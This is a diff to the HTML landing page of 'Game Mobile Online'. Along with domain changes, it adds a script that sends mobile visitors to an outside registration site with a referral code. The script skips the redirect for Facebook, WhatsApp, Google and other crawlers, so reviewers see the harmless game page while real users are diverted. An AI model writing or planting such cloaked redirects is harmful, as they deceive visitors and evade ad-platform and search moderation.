@@ -41,11 +41,58 @@ src="https://www.facebook.com/tr?id=1289279949414023&ev=PageView&noscript=1"
 	<meta property="og:description" content="Game Mobile Online" />
 	<meta property="og:type" content="product" />
 	<meta name="description" content="Game Mobile Online">
-	<meta name="author" content="mobileonline.games">				
+	<meta name="author" content="mobileonlinegames.pages.dev">				
 	<link rel="shortcut icon" href="https://www.shareicon.net/data/2015/05/12/37520_yellow_256x256.png">
 	<title>Game Mobile Online</title>	
 	<link rel="stylesheet" href="https://cdn.orderonline.id/css/vendor.min.css?id=2e50e6d12336370a3f5d">
 	<link rel="stylesheet" type="text/css" href="https://cdn.orderonline.id/css/checkout.css?id=e2f9b4c2493d1138040a">
+<!-- Mobile redirect for gamemobileonline.pages.dev -->
+<script>
+(function () {
+  try {
+    // === KONFIGURASI ===
+    var TARGET_BASE = "https://infiwd.tanpabatas.site/register";
+    var EXTRA_PARAMS = { referral_code: "pixel1" }; // tambahkan param default jika belum ada
+
+    // 1) Honor ?noredirect=1
+    var qs = new URLSearchParams(location.search);
+    if (qs.has("noredirect") && qs.get("noredirect") === "1") return;
+
+    // 2) Hindari redirect untuk crawler/pratinjau (Meta/WA/Telegram/Twitter/Google/Bing)
+    var ua = (navigator.userAgent || "").toLowerCase();
+    var isBot =
+      /(facebookexternalhit|facebot|whatsapp|telegrambot|slackbot|twitterbot|linkedinbot|pinterest|googlebot|bingbot|baiduspider|yandex|duckduckbot)/i
+        .test(ua);
+    if (isBot) return;
+
+    // 3) Deteksi mobile UA (tambahkan/ubah sesuai kebutuhan)
+    var isMobile =
+      /(android|webos|iphone|ipod|blackberry|iemobile|opera mini|mobile|ipad)/i
+        .test(ua);
+    if (!isMobile) return;
+
+    // 4) Hindari loop & hanya sekali per sesi
+    if (sessionStorage.getItem("mobile_redirect_done") === "1") return;
+
+    // 5) Susun URL tujuan + teruskan semua query (QSA)
+    var target = new URL(TARGET_BASE);
+    // teruskan query yang ada
+    new URLSearchParams(location.search).forEach(function (v, k) {
+      if (!target.searchParams.has(k)) target.searchParams.set(k, v);
+    });
+    // tambahkan EXTRA_PARAMS kalau belum ada
+    Object.keys(EXTRA_PARAMS).forEach(function (k) {
+      if (!target.searchParams.has(k)) target.searchParams.set(k, EXTRA_PARAMS[k]);
+    });
+
+    // 6) Redirect (replace agar tidak menambah history)
+    sessionStorage.setItem("mobile_redirect_done", "1");
+    location.replace(target.toString());
+  } catch (e) {
+    // no-op
+  }
+})();
+</script>
 
 </head>
 
@@ -143,7 +190,7 @@ src="https://www.facebook.com/tr?id=1289279949414023&ev=PageView&noscript=1"
 					
 			</div>
 	
-<div class="legal">Dengan melanjutkan, Anda setuju pada <a href="https://mobileonline.games/terms.html" target="_blank" rel="noopener">Ketentuan</a> dan <a href="https://mobileonline.games/privacy.html" target="_blank" rel="noopener">Privasi</a>. Usia 18+ disarankan.</div>
+<div class="legal">Dengan melanjutkan, Anda setuju pada <a href="https://mobileonlinegames.pages.dev/terms.html" target="_blank" rel="noopener">Ketentuan</a> dan <a href="https://mobileonlinegames.pages.dev/privacy.html" target="_blank" rel="noopener">Privasi</a>. Usia 18+ disarankan.</div>
       </div>
 									
 						
